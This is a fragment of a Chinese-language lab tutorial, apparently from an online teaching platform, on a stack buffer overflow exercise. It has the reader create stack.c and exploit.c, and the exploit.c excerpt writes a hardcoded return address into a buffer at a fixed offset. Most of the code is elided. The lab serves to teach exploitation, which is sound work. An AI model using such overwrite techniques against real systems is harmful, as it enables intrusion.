...
![此处输入图片的描述](https://doc.shiyanlou.com/document-uid8797labid749timestamp1526448289378.png)
...
在 `/home/shiyanlou` 目录下新建一个 `stack.c` 文件：
...
在 `/home/shiyanlou` 目录下新建一个 `exploit.c` 文件，输入如下内容：
...
void main(int argc, char **argv)
{
    ...
    strcpy(buffer+0x34, "\x9b\xd4\xff\xff");   
...
![02-04-](https://doc.shiyanlou.com/xxaq/02-04-.png/wm)
